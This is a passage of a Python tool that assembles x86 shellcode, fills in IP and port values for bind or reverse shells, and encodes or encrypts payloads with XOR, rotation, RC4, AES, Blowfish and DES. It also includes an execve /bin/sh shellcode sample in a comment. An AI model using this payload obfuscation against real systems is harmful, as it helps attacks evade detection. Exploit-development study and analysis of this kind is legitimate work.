# !/usr/bin/env python3
# -*- coding: utf-8 -*-

# Filename: shellcodeit.py
# Author:  xpirabit

""" An attempt to automate various of the procedures required to assemble, 
	link, encode, decode, encrypt, decrypt and analyze x86 shellcode 
"""
# Usage Menu: python3 shellcodeit.py -h

# [!]
# For the IP address and port wrapping (for bind and/or reverse shells)
# remember to set the placeholders as seen below in your .asm/.nasm files
# IP address: push 0xBBBBBBBB
# Port: 0xAAAA

# Tab Width: 4 spaces
# Comments width: 78

# Execve() shellcode for testing purposes:
# \x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73
# \x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80

import argparse
from argparse import ArgumentParser
from argparse import RawTextHelpFormatter
import sys
import os
from subprocess import Popen, PIPE, STDOUT
import ipaddress
import re
import random
import binascii
import string
import hashlib


try:
	# blake2s() is only supported using Python 3.6
	# Added for the DEP 8-byte encryption key.
	from hashlib import blake2s
	python36_check = True
except ImportError:
	python36_check = False
	pass

try:
	# https://github.com/buffer/libemu
	# https://github.com/buffer/pylibemu
	import pylibemu
	libemu_check = True
except ImportError:
	libemu_check = False
	pass

try:
	# python -m pip install pycrypto (up to Python 3.5)
	# https://github.com/dlitz/pycrypto/tree/master/lib/Crypto/Cipher
	# python3.6 -m pip install pycryptodome (Python 3.6 and later)
	# https://github.com/Legrandin/pycryptodome/tree/master/lib/Crypto/Cipher
	from Crypto.Cipher import AES, Blowfish, DES
	from Crypto.Random import get_random_bytes
	crypto_check = True
except ImportError:
	crypto_check = False
	pass

# For shellcode execution
import ctypes
from ctypes import *

#----------------------------------------------------------------------------
""" A few colors for a pretty output """
class Bcolors:
	# Python code from the Blender build scripts
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
#----------------------------------------------------------------------------


#----------------------------------------------------------------------------
""" Classes for Error Exceptions """
class Error(Exception):
	""" Base error exception class """
	pass
class PortNumber(Error):
	""" Inappropriate port number """
	pass
class NullByte(Error):
	""" Null byte(s) found on hex representation of port """
	pass
class FileNotFound(Error):
	""" File not found """
	pass
class OutofBounds(Error):
	""" Integer out of bounds """
	pass
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" Check that nasm, ld and objdump are present """
def requirements():
	requirements = True
	# Ensure nasm is installed
	nasm = ["which", "nasm"]
	p = Popen(nasm, stdout=PIPE)
	if p.communicate()[0] == b'':
		print(bcolors.WARNING + '[!] Please install nasm!\n' + bcolors.ENDC)
		requirements = False
	# Ensure ld is installed
	ld = ["which", "ld"]
	p = Popen(ld, stdout=PIPE)
	if p.communicate()[0] == b'':
		print(bcolors.WARNING + '[!] Please install ld!\n' + bcolors.ENDC)
		requirements = False
	# Ensure objdump is installed
	objdump = ["which", "objdump"]
	p = Popen(objdump, stdout=PIPE)
	if p.communicate()[0] == b'':
		print(bcolors.WARNING + '[!] Please install objdump!\n' + bcolors.ENDC)
		requirements = False
	return requirements
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" Necessary functions for conertions """
def opcodes2bytes(opcodes):
	# Return the binary data represented by opcodes string
	return binascii.unhexlify(opcodes)

def bytes2shellcode(payload):
	# Convert the binary data into printable and readable form
	# I could do this convertion while create the shellcodes 
	# within the encoding/encryption functions
	return ''.join( [ "\\x%02x"%value for value in payload])

def shellcode2bytes(shellcode):
	# For the given shellcode, escape double slashes (\\x)
	# Encode using ISO-8859-1 a.k.a Latin-1 which maps the code
	# points 0–255 to the bytes 0x0–0xff
	return str.encode(shellcode).decode('unicode-escape').encode('ISO-8859-1')

def shellcode2nasm(shellcode):
	# Convert the shellcode into .nasm usable form
	return ",".join([str.replace(shellcode, "\\x", "0x")[i:i+4] for i in range(0, len(shellcode), 4)])

def padding(shellcode, bs):
	# NOP padding for Block Cipher encryption schemes
	return shellcode + "\\x90"*(bs - (len(shellcode)//4)%bs)

def unpadding(shellcode):
	# Remove the NOP padding used in AES-256/Blowfish encryption scheme
	# Dumb way because there are cases where the shellcode contains NOPs
	# deliberately. Need to change..
	return shellcode.replace('\\x90', '')
#----------------------------------------------------------------------------

# [!] One does not simply use self. sparingly
# [!] Brace yourselves..

#----------------------------------------------------------------------------
class File(object):
	""" Initialize the File object """
	def __init__(self, file, hexaddr, hexport):
		# Get the filname without the extension
		self.fname, self.fextension = os.path.splitext(file)
		# Attributes
		self.opcodes = self.payload = self.shellcode = ''
		self.hexaddr = hexaddr
		self.hexport = hexport
		self.length = 0
	
	""" Assemble and Link the supplied file """
	def assemble(self):
		# Assemble the .nasm file using nasm
		nasm = ["nasm", "-f", "elf", self.fname+self.fextension]
		p = Popen(nasm, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
		out, err = p.communicate()
		# Print the stdout and stderr if present
		if out:
			msg = "[!] Standard Output of nasm:"
			print(Bcolors.WARNING + msg + Bcolors.ENDC)
			# Decode the bytes object to utf-8 
			print(out.decode("utf-8"))
			sys.exit(1)
		if err:
			msg = "[!] Standard Error of nasm:"
			print(Bcolors.WARNING + msg + Bcolors.ENDC)
			# Decode the bytes object to utf-8
			print(err.decode('utf-8'))
			sys.exit(1)
		# Link the object file using ld
		ld = ["ld", "-o", self.fname, self.fname+".o"]
		p = Popen(ld, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
		# Print the stdout and stderr if present
		out, err = p.communicate()
		if out:
			msg = "[!] Standard Output of ld:"
			print(Bcolors.WARNING + msg + Bcolors.ENDC)
			# Decode the bytes object to utf-8
			print(out.decode("utf-8"))
			sys.exit(1)
		if err:
			msg = "[!] Standard Error of ld:"
			print(Bcolors.WARNING + msg + Bcolors.ENDC)
			# Decode the bytes object to utf-8
			print(err.decode('utf-8'))
			sys.exit(1)
	
	""" Use objdump to generate the shellcode of the supplied file """
	def objdump(self):
		# Get the objdump output for the executable
		objdump = ["objdump", "-d", self.fname, "-M", "intel"]
		p = Popen(objdump, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
		output, err = p.communicate()
		# Decode the bytes object to utf-8
		output = output.decode('utf-8')
		# Split is done using the new line (\n) as the delimeter
		# 7 is used to not include the first 7 lines of the objdump output
		# These lines do not contain any shellcode
		for line in output.split('\n')[7:]:
		# line = '8048060:	31 db                	xor    ebx, ebx'
			output = line.split(':')
			# line.split(':') --> [' 8048060', '\t31 db    \txor  ebx, ebx']
			# If objdump contains more than 1 substrings and objdump[1] 
			# (the second element/substring) has the opcodes, replace
			# the whole objdump line with only the opcodes and the command
			# Therefore, removing the address of each command
			# This is need because of the etiquette lines
			# i.e line = '080480a3 <loop>:'
			if len(output) > 1 and len(output[1]) > 0: 
				output = output[1]
			else:
				continue
			# Splitting with tabs
			output = ''.join(output).split('\t')
			# ''.join(objdump) --> '\t31 db   \txor    ebx, ebx'
			# ''.join(objdump).split('\t') --> ['', '31 db ', 'xor ebx, ebx']
			if len(output) > 1: 
				output = output[1].strip().replace(' ', '')
			#.strip() removes all whitespace at the start and end, 
			# including spaces, tabs, newlines and carriage returns
			# objdump.strip().replace(' ', '') --> '31db'
			# .replace(' ', '') removes the whitespace between the opcodes
			self.opcodes += output
		# Replace the "BBBBBBBB" placeholder with the user supplied address
		if (self.hexaddr):
			self.opcodes = str.replace(self.opcodes, "bbbbbbbb", self.hexaddr, 1)
		# Replace the "AAAA" placeholder with the user supplied port in hex
		if (self.hexport):
			self.opcodes = str.replace(self.opcodes, "aaaa", self.hexport, 1)
		self.payload = opcodes2bytes(self.opcodes)
		self.length = len(self.payload)
		self.shellcode = bytes2shellcode(self.payload)
#----------------------------------------------------------------------------


#----------------------------------------------------------------------------
class Shellcode(object):
	""" Initialize the Shellcode object """
	def __init__(self, shellcode):
		# Attributes
		self.shellcode = shellcode
		self.payload = shellcode2bytes(self.shellcode)
		self.length = len(self.payload)
#----------------------------------------------------------------------------


#----------------------------------------------------------------------------
class EncodedShellcode(object):
	""" Initialize the EncodedShellcode object """
	def __init__(self, payload, shellcode):
		# Attributes
		self.shellcode = shellcode
		self.payload = payload
		self.length = len(self.payload)
		self.encoded_payload = b''
		self.encoded_shellcode = self.key = ''
		self.en_length = 0
		
	""" XOR Encode the payload """
	def xor_encode(self, xor_key):
		# XOR Encoder is also available in the Crypto.Cipher library
		try:
			# If there is already in the payload
			if xor_key in self.payload:
				# Raise the exception to avoid null bytes
				raise NullByte
			else:
				self.key = xor_key
				# XOR Encoding
				encoded_opcodes = ''.join(['%02x'%(value^xor_key) for value in self.payload])
				self.en_length = len(encoded_opcodes)//2
				self.encoded_payload = opcodes2bytes(encoded_opcodes)
				self.encoded_shellcode = bytes2shellcode(self.encoded_payload)
		except NullByte:
			msg = "[!] The same byte exists on your payload, thus XORing with it will result in null bytes!"
			print(Bcolors.WARNING + msg + Bcolors.ENDC)
			sys.exit(1)
	
	""" ADD Encode the payload """
	def add_encode(self, add_key):
		# Add function
		add = lambda val, add_key: ( (val+add_key) & (2**8-1) ) + ( (val+add_key) >> 8 )
		self.key = add_key
		# Add Encoding
		encoded_opcodes = ''.join(['%02x'%(add(value, add_key)) for value in self.payload])
		self.en_length = len(encoded_opcodes)//2
		self.encoded_payload = opcodes2bytes(encoded_opcodes)
		self.encoded_shellcode = bytes2shellcode(self.encoded_payload)

	""" SUB Encode the payload """
	def sub_encode(self, sub_key):
		# Sub function
		sub = lambda val, sub_key: ( (val-sub_key) >> 8 ) + ( (val-sub_key) & (2**8-1) )
		try:
			# If the sub key is already in the payload, it means that after 
			# the encoding, a null byte will have appeared
			if sub_key in self.payload:
				# Raise the exception to avoid null bytes
				raise NullByte
			else:
				self.key = sub_key
				# Sub Encoding
				encoded_opcodes = ''.join(['%02x'%(sub(value, sub_key)) for value in self.payload])
				self.en_length = len(encoded_opcodes)//2
				self.encoded_payload = opcodes2bytes(encoded_opcodes)
				self.encoded_shellcode = bytes2shellcode(self.encoded_payload)
		except NullByte:
			msg = "[!] Because %s (%s) already exists in your shellcode, the sub encoding/decoding will result in 0x0 for that byte!"%(sub_key, hex(sub_key))
			print(Bcolors.WARNING + msg + Bcolors.ENDC)
			sys.exit(1)

	""" ROT Encode the payload """
	def rot_encode(self, rot_n):
		self.key = rot_n
		# Rot Encoding
		rot = lambda value, rot_n: '%02x'%((value + rot_n)%256)
		encoded_opcodes = ''.join([ rot(value, rot_n) for value in self.payload])
		self.en_length = len(encoded_opcodes)//2
		self.encoded_payload = opcodes2bytes(encoded_opcodes)
		self.encoded_shellcode = bytes2shellcode(self.encoded_payload)		
		
	""" ROL Encode the payload """
	def rol_encode(self, rol_bits):
		self.key = rol_bits
		# Left Shift Rotate for r_bits bits on a number with width max_bits
		rol = lambda val, r_bits, max_bits: (val << r_bits%max_bits) & (2**max_bits-1) | ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
		# Rol Encoding
		encoded_opcodes = ''.join(['%02x'%(rol(value, rol_bits, 8)) for value in self.payload])
		self.en_length = len(encoded_opcodes)//2
		self.encoded_payload = opcodes2bytes(encoded_opcodes)
		self.encoded_shellcode = bytes2shellcode(self.encoded_payload)		
	
	""" ROR Encode the payload """
	def ror_encode(self, ror_bits):
		self.key = ror_bits
		# Right Shift Rotate for r_bits bits on a number with width max_bits
		ror = lambda val, r_bits, max_bits: ((val & (2**max_bits-1)) >> r_bits%max_bits) | (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
		# Ror Encoding
		encoded_opcodes = ''.join(['%02x'%(ror(value, ror_bits, 8)) for value in self.payload])
		self.en_length = len(encoded_opcodes)//2
		self.encoded_payload = opcodes2bytes(encoded_opcodes)
		self.encoded_shellcode = bytes2shellcode(self.encoded_payload)		
	
	""" Insertion Encode the payload """
	def insertion_encode(self, ins_key):
		self.key = ins_key
		# If the user has supplied a specific key to insert
		if (ins_key != 'random'):
			# Insertion Encoding
			encoded_opcodes = ''.join(['%02x%02x'%(value, ins_key) for value in self.payload])
			self.en_length = len(encoded_opcodes)//2
			self.encoded_payload = opcodes2bytes(encoded_opcodes)
			self.encoded_shellcode = bytes2shellcode(self.encoded_payload)	
		# If the user has not supplied a key to insert
		# Insert a random byte for each iteration
		else:
			# Insertion Encoding
			encoded_opcodes = ''.join(['%02x%02x'%(value, random.randint(1, 255)) for value in self.payload])
			self.en_length = len(encoded_opcodes)//2
			self.encoded_payload = opcodes2bytes(encoded_opcodes)
			self.encoded_shellcode = bytes2shellcode(self.encoded_payload)	
#----------------------------------------------------------------------------


#----------------------------------------------------------------------------
class EncryptedShellcode(object):
	""" Initialize the EncryptedShellcode object """
	def __init__(self, payload, shellcode):
		# Attributes
		self.shellcode = shellcode
		self.payload = payload
		self.length = len(self.payload)
		self.encrypted_payload = self.salt = self.IV = self.hashed_key = ''
		self.encrypted_shellcode = self.salt_shellcode = self.IV_shellcode = self.hashed_key_shellcode = self.key = ''
		self.en_length = self.hashed_key_length = self.salt_length = self.IV_length = 0
		
	""" Rivest Cipher 4 Encryption """
	def rc4_encrypt(self, rc4_key):
		self.key = rc4_key
		# To generate the keystream, the cipher makes use of a secret 
		# internal state which consists of two parts:
		""" Key-scheduling algorithm (KSA) """
		S = bytearray(list(range(256)))
		j = 0
		for i in range(256):
			# ord(key[i % len(key)]) ?
			j = (j + S[i] + ord(rc4_key[i % len(rc4_key)]))%256
			S[i], S[j] = S[j], S[i]
		""" Pseudo-random generation algorithm (PRGA) """
		i = j = 0
		encrypted_opcodes = ''
		for value in self.payload:
			i = (i + 1)%256
			j = (j + S[i])%256
			S[i], S[j] = S[j], S[i]
			encrypted_opcodes += "%02x"%(value ^ S[(S[i] + S[j]) % 256])
		self.en_length = len(encrypted_opcodes)//2
		self.encrypted_payload = opcodes2bytes(encrypted_opcodes)
		self.encrypted_shellcode = bytes2shellcode(self.encrypted_payload)	

	""" Preparations for the upcoming Block Ciphers Encryption Schemes """
	def encryption_prep(self, bs):
		# Shellcode padding according to the block size
		self.shellcode = padding(self.shellcode, bs)
		self.payload = shellcode2bytes(self.shellcode)
		self.length = len(self.payload)
		# Initialization Vector ( As long as the Block Size )
		self.IV = get_random_bytes(bs)
		self.IV_length = len(self.IV)
		self.IV_shellcode = bytes2shellcode(self.IV)
		# salt ( As long as the Block Size)
		self.salt = get_random_bytes(bs)
		self.salt_length = len(self.salt)
		self.salt_shellcode = bytes2shellcode(self.salt)

	""" AES-256 Encryption """
	def aes256_encrypt(self, aes_key):
		# Get block size (128-bit / 16 bytes)
		bs = AES.block_size
		# Cipher Block Chaining mode (Mode 2)
		mode = AES.MODE_CBC
		# Encryption Key
		self.key = aes_key
		# Convert supplied key to bytes
		key = str.encode(self.key)
		# Call the encryption_prep() function with the block 
		# size to pad the shellcode and create the IV and salt.
		self.encryption_prep(bs)
		# AES256 Keys can be 128, 192, or 256 bits long.
		# The user supplied key does not need to be 32 bytes long (256-bit)
		# Only password managers generate this kind of keys ;)
		# Use sha256 in conjuction with the salt to convert whichever key to
		# a new 256-bit long key. So even if the supplied key is > 32 bytes
		# it gets converted to 32.
		self.hashed_key = hashlib.sha256(key + self.salt).digest()
		self.hashed_key_length = len(self.hashed_key)
		self.hashed_key_shellcode = bytes2shellcode(self.hashed_key)
		# Create a fresh AES object
		cipher = AES.new(self.hashed_key, mode, self.IV)
		# Generate the cipher text
		# The first group of 16 bytes represent the salt
		# The second group of 16 bytes represent the IV
		ciphertext = self.salt + self.IV + cipher.encrypt(self.payload)
		encrypted_opcodes = ''.join(['%02x'%value for value in bytearray(ciphertext)])
		self.en_length = len(encrypted_opcodes)//2
		self.encrypted_payload = opcodes2bytes(encrypted_opcodes)
		self.encrypted_shellcode = bytes2shellcode(self.encrypted_payload)	


	""" Blowfish Encryption """
	def blowfish_encrypt(self, blowfish_key):
		# Get block size (64-bits / 8 bytes)
		bs = Blowfish.block_size
		# Cipher Block Chaining mode (Mode 2)
		mode = Blowfish.MODE_CBC
		# Encryption Key
		self.key = blowfish_key
		# Convert supplied key to bytes
		key = str.encode(self.key)
		# Call the encryption_prep() function with the block 
		# size to pad the shellcode and create the IV and salt.
		self.encryption_prep(bs)
		# Blowfish Keys length from 32 (4) to 448 (56) bits (bytes)
		# The user supplied key does not need to be 56 bytes long (448-bit)
		# Only password managers generate this kind of keys ;)
		# As with AES, sha384 in conjuction with the salt can be used 
		# to convert whichever key to a new 384-bit long key.
		# Not the maximum available but hey..
		# Therefore, the supplied key gets converted to 384 bits (48 bytes).
		#self.hashed_key = hashlib.sha384(key + self.salt).digest()
		# [!] However the decryption with OpenSSl 1.0.2.g on a C Decrypter
		# key's length needs to be 16 bits! Therefore instead of sha384,
		# md5 or blake2s with digest size of 16 bytes must be used
		#self.hashed_key = blake2s(key + self.salt, digest_size = 16).digest()
		self.hashed_key = hashlib.md5(key + self.salt).digest()
		self.hashed_key_length = len(self.hashed_key)
		self.hashed_key_shellcode = bytes2shellcode(self.hashed_key)
		# Create a fresh Blowfish object
		cipher = Blowfish.new(self.hashed_key, mode, self.IV)
		# Generate the cipher text
		# The first group of 16 bytes represent the salt
		# The second group of 16 bytes represent the IV
		ciphertext = self.salt + self.IV + cipher.encrypt(self.payload)
		encrypted_opcodes = ''.join(['%02x'%value for value in bytearray(ciphertext)])
		self.en_length = len(encrypted_opcodes)//2
		self.encrypted_payload = opcodes2bytes(encrypted_opcodes)
		self.encrypted_shellcode = bytes2shellcode(self.encrypted_payload)	

	""" DES Encryption """
	def des_encrypt(self, des_key):
		# Get block size (64-bits / 8 bytes)
		bs = DES.block_size
		# Cipher Block Chaining Mode (Mode 2)
		mode = DES.MODE_CBC
		# Encryption Key
		self.key = des_key
		# Keys are 64-bit (8 bytes) long
		key = str.encode(self.key)
		# Call the encryption_prep() function with the block 
		# size to pad the shellcode and create the IV and salt.
		self.encryption_prep(bs)
		# For the DES encryption the user would have to submit an 8 bytes key, 
		# no more, nor less. Instead of having this restriction, w/ Python 3.6
		# we can use blake2b with a specific digest_size to generate the 
		# 8 bytes long key from the supplied one in conjuction with the hash.
		self.hashed_key = blake2s(key + self.salt, digest_size = 8).digest()
		self.hashed_key_length = len(self.hashed_key)
		self.hashed_key_shellcode = bytes2shellcode(self.hashed_key)
		# Initialization Vector (64-bit / 8 bytes / DES Block Size
		self.IV = get_random_bytes(bs)
		self.IV_length = len(self.IV)
		self.IV_shellcode = bytes2shellcode(self.IV)
		# Create a fresh DES object
		cipher = DES.new(self.hashed_key, mode, self.IV)
		# Generate the cipher text
		# The first group of 16 bytes represent the salt
		# The second group of 16 bytes represent the IV
		ciphertext = self.salt + self.IV + cipher.encrypt(self.payload)
		encrypted_opcodes = ''.join(['%02x'%value for value in bytearray(ciphertext)])
		self.en_length = len(encrypted_opcodes)//2
		self.encrypted_payload = opcodes2bytes(encrypted_opcodes)
		self.encrypted_shellcode = bytes2shellcode(self.encrypted_payload)	

	""" Preparation for the upcoming Block Cipher Decryption Schemes """
	def decryption_prep(self, bs):
		# The first group of bs bytes represent the salt
		self.salt = self.payload[:bs]
		# The second group of bs bytes represent the IV
		self.IV = self.payload[bs:2*bs]
		# The cipher object created during the encryption
		cipher = self.payload[2*bs::]
		return cipher

	""" AES-256 Decryption """
	def aes256_decrypt(self, aes_dec_key):
		# Get block size (128-bit / 16 bytes)
		bs = AES.block_size
		# Cipher Block Chaining mode (Mode 2)
		mode = AES.MODE_CBC
		# Decryption Key
		self.key = aes_dec_key
		# Convert the supplied key to bytes
		key = str.encode(self.key)
		# Call the decryption_prep function to set the appropriate
		# salt, IV and cipher
		cipher = self.decryption_prep(bs)
		# Generate the hashed_key using the supplied key and salt
		self.hashed_key = hashlib.sha256(key + self.salt).digest()
		# Create a fresh AES object
		plain = AES.new(self.hashed_key, mode, self.IV)
		plaintext = plain.decrypt(cipher)
		# Instead of declaring new variables i.e decrypted_shellcode, 
		# use the already existing variables.
		encrypted_opcodes = ''.join(['%02x'%value for value in bytearray(plaintext)])
		self.encrypted_payload = opcodes2bytes(encrypted_opcodes)
		self.encrypted_shellcode = bytes2shellcode(self.encrypted_payload)
		# Remove the padding
		self.encrypted_shellcode = unpadding(self.encrypted_shellcode)
		self.en_length = len(self.encrypted_shellcode)//4
		self.hashed_key = b''

	""" Blowfish Decryption """
	def blowfish_decrypt(self, blowfish_dec_key):
		# Get block size (64-bits / 8 bytes)
		bs = Blowfish.block_size
		# Cipher Block Chaining mode (Mode 2)
		mode = Blowfish.MODE_CBC		
		# Decryption Key
		self.key = blowfish_dec_key
		# Convert the supplied key to bytes
		key = str.encode(self.key)
		# Call the decryption_prep function to set the appropriate
		# salt, IV and cipher
		cipher = self.decryption_prep(bs)
		# Generate the hashed_key using the supplied key and salt
		#self.hashed_key = hashlib.sha384(key + self.salt).digest()
		self.hashed_key = hashlib.md5(key + self.salt).digest()
		# Create a fresh Blowfish object
		plain = Blowfish.new(self.hashed_key, mode, self.IV)
		plaintext = plain.decrypt(cipher)
		# Instead of declaring new variables i.e decrypted_shellcode, 
		# use the already existing variables.
		encrypted_opcodes = ''.join(['%02x'%value for value in bytearray(plaintext)])
		self.encrypted_payload = opcodes2bytes(encrypted_opcodes)
		self.encrypted_shellcode = bytes2shellcode(self.encrypted_payload)
		# Remove the padding
		self.encrypted_shellcode = unpadding(self.encrypted_shellcode)
		self.en_length = len(self.encrypted_shellcode)//4
		self.hashed_key = b''

	""" DES Decryption """	
	def des_decrypt(self, des_dec_key):
		# Get block size (64-bits / 8 bytes)
		bs = DES.block_size
		# Cipher Block Chaining Mode (Mode 2)
		mode = DES.MODE_CBC
		# Encryption Key
		self.key = des_dec_key
		# Keys are 64-bit (8 bytes) long
		key = str.encode(self.key)
		# Call the decryption_prep function to set the appropriate
		# salt, IV and cipher
		cipher = self.decryption_prep(bs)
		# Generate the hashed_key using the supplied key and salt
		self.hashed_key = blake2s(key + self.salt, digest_size = 8).digest()
		# Create a fresh DES object
		plain = DES.new(self.hashed_key, mode, self.IV)
		plaintext = plain.decrypt(cipher)
		# Instead of declaring new variables i.e decrypted_shellcode, 
		# use the already existing variables.
		encrypted_opcodes = ''.join(['%02x'%value for value in bytearray(plaintext)])
		self.encrypted_payload = opcodes2bytes(encrypted_opcodes)
		self.encrypted_shellcode = bytes2shellcode(self.encrypted_payload)
		# Remove the padding
		self.encrypted_shellcode = unpadding(self.encrypted_shellcode)
		self.en_length = len(self.encrypted_shellcode)//4
		self.hashed_key = b''
#----------------------------------------------------------------------------


#----------------------------------------------------------------------------
class Analysis(object):
	""" Initialize the Analysis object """
	def __init__(self, payload, shellcode):
		# Attributes
		self.shellcode = shellcode
		self.payload = payload
		self.ndisasm_output = self.file_output = ''
		self.libemu_offset = self.libemu_getpc = self.sctest_cfg = self.sctest_output = ''
		self.result = False

	""" Use ndisasm to analyze the shellcode stream """
	def ndisasm(self):
		# Due to the fact that we want to pipe the output of the echo command
		# but I don't like using shell=True, I will create two processes and 
		# pipe them together
		cmd = ["echo", "-ne", self.shellcode]
		p1 = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
		cmd = ["ndisasm", "-u", "-"]
		p2 = Popen(cmd, stdin=p1.stdout, stdout=PIPE)
		output, err = p2.communicate()
		# Decode the bytes object to utf-8
		self.ndisasm_output = output.decode('utf-8')

	""" Use Libemu to emulate the shellcode and identify GetPC """
	def libemu(self, sctest_cfg):
		self.sctest_cfg = sctest_cfg
		self.result = True
		# Identify Libemu's available methods:	
		# e = pylibemu.Emulator()
		# for method in dir(e):
		# print(method)
		# print(method.__doc__)
		# print()
		# Ensure that GetPC code was found
		# Output Buffer 2048
		emulator = pylibemu.Emulator(2048)
		try:
			# Find the payload offset
			self.libemu_offset = emulator.shellcode_getpc_test(self.payload)
			if self.libemu_offset >= 0:
				# GetPC code detected
				#emulator.prepare(self.payload, self.libemu_offset)
				# maxsteps 10000000
				#emulator.test(10000000)
				#self.libemu_getpc = emulator.emu_profile_output
				# Sctest with GetPC mode
				sctest_arg = "-Sgs"
			else:
				# No GetPC code detected. Use Sctest without GetPC mode
				sctest_arg = "-Ss"
		except:
			self.result = False
		# This can also work with payload (bytes array), if it does not
		# contain null bytes. Therefore, I echo the shellcode (string)
		cmd = ["echo", "-ne", self.shellcode]
		p1 = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
		# Pipe the output of echo into stdin for sctest
		cmd = ["sctest", "-vvvvvvv", "%s"%sctest_arg, "1000000", "-G", "%s"%self.sctest_cfg]
		p2 = Popen(cmd, stdin=p1.stdout, stdout=PIPE)
		output, err = p2.communicate()
		# Decode the bytes object to utf-8
		self.sctest_output = output.decode('utf-8')
		# Generate and save the Control Flow Diagram of the shellcode
		cmd = ["dot", "%s"%self.sctest_cfg, "-Tpng", "-o", "%s.png"%self.sctest_cfg]
		p = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
		p.wait()
		# Ensure that the file has been created
		cmd = ["file", "%s.png"%self.sctest_cfg]
		p = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
		output, err = p.communicate()
		self.file_output = output.decode('utf-8')
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" Print the available results """
def printer(shellcode, length, encoded, encrypted, analysis, nasm):
	# The shellcode
	if nasm:
		shellcode = shellcode2nasm(shellcode)
	msg1 = "\n[+] Shellcode (%s bytes):"%(length)
	msg2 = "\n\r\b%s\n"%(shellcode)
	print(Bcolors.OKGREEN + msg1 + Bcolors.ENDC + msg2)
	if '00' in shellcode:
		msg = "[!] Warning: Null byte(s) exist(s) in your shellcode!\n"
		print(Bcolors.WARNING + msg + Bcolors.ENDC)
	# The encoded shellcode
	if encoded.encoded_shellcode:
		if nasm:
			encoded.encoded_shellcode = shellcode2nasm(encoded.encoded_shellcode)
		msg1 = "[+] Encoded Shellcode (%s bytes):"%(encoded.en_length)
		msg2 = "\n\r\b%s\n"%(encoded.encoded_shellcode)
		print(Bcolors.OKGREEN + msg1 + Bcolors.ENDC + msg2)
		if '00' in encoded.encoded_shellcode:
			msg = "[!] Warning: Null byte(s) exist(s) in your encoded shellcode!\n"
			print(Bcolors.WARNING + msg + Bcolors.ENDC)
	# The encrypted shellcode
	if encrypted.encrypted_shellcode:
		if nasm:
			encrypted.encrypted_shellcode = shellcode2nasm(encrypted.encrypted_shellcode)
		msg1 = "[+] Encrypted Shellcode (%s bytes):"%(encrypted.en_length)
		msg2 = "\n\r\b%s\n"%(encrypted.encrypted_shellcode)
		print(Bcolors.OKGREEN + msg1 + Bcolors.ENDC + msg2)
		if '00' in encrypted.encrypted_shellcode:
			msg = "[!] Warning: Null byte(s) exist(s) in your encrypted shellcode!\n"
			print(Bcolors.WARNING + msg + Bcolors.ENDC)
		# The AES-256/DES/Blowfish encryption attributes
		if encrypted.hashed_key:
			if nasm:
				encrypted.hashed_key_shellcode = shellcode2nasm(encrypted.hashed_key_shellcode)
				encrypted.IV_shellcode = shellcode2nasm(encrypted.IV_shellcode)
				encrypted.salt_shellcode = shellcode2nasm(encrypted.salt_shellcode)
			msg1 = "[+] Hashed Key (%s bytes):"%(encrypted.hashed_key_length)
			msg2 = "\n\r\b%s\n"%(encrypted.hashed_key_shellcode)
			print(Bcolors.OKGREEN + msg1 + Bcolors.ENDC + msg2)
			msg1 = "[+] Initialization Vector (%s bytes):"%(encrypted.IV_length)
			msg2 = "\n\r\b%s\n"%(encrypted.IV_shellcode)
			print(Bcolors.OKGREEN + msg1 + Bcolors.ENDC + msg2)
			msg1 = "[+] Salt (%s bytes):"%(encrypted.salt_length)
			msg2 = "\n\r\b%s\n"%(encrypted.salt_shellcode)
			print(Bcolors.OKGREEN + msg1 + Bcolors.ENDC + msg2)
	# The Ndisasm Analysis
	if analysis.ndisasm_output:
		msg1 = "\n[+] Ndisasm Output:"
		msg2 = "\n\r\b%s\n"%(analysis.ndisasm_output)
		print(Bcolors.OKGREEN + msg1 + Bcolors.ENDC + msg2)
	# The Libemu output
	if analysis.result:
		if analysis.libemu_offset >= 0:
			msg = "[+] Libemu Emulation: Detected GetPC code with offset: %d"%analysis.libemu_offset
			print(Bcolors.OKGREEN + msg + Bcolors.ENDC)
			if not analysis.result:
				msg = ["[!] Libemu Emulation Failed!\n"]
				print(Bcolors.WARNING + msg + Bcolors.ENDC)
			else:
				print(analysis.libemu_getpc)
		else:
			msg = "[!] Libemu Emulation: No GetPC code detected!\n"
			print(Bcolors.WARNING + msg + Bcolors.ENDC)		
		msg = "[+] sctest's CFG has been created:"
		print(Bcolors.OKGREEN + msg + Bcolors.ENDC)
		print(analysis.file_output)
		if '11 x 11' in analysis.file_output:
			msg = "[!] The CFG .png is probably empty! Sctest could not present C code in its analysis!\n"
			print(Bcolors.WARNING + msg + Bcolors.ENDC)
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" Verify that the file exists and has the proper extension """
def verify_file(file):
	# Save the file name (without the extension) and the extension
	fname, fextension = os.path.splitext(file)
	try:
		# If the file exists and its extension is either .nasm or .asm, 
		# continue. It's an ASCII text file so why check for the extension?
		# Because I'd like the same name for the executable and I wouldn't 
		# want the text file to be overwritten by it.
		if (os.path.exists(file) and (fextension == '.nasm' or fextension =='.asm')): 
			return file
		else:
			raise FileNotFound
	except FileNotFound:
		msg = "[!] .nasm/.asm file not found! Ensure that the file exists and the extension is supplied correctly!"
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" Verify that the user supplied shellcode is valid """
def verify_shellcode(shellcode):
	# Regex for the given shellcode
	regex = r"(\\x[0-9a-fA-F]{2})+"
	try:
		# Check if there is a match and ensure that the ending position
		# matches the length of the shellcode
		# If it's stupid, but it works, it ain't stupid
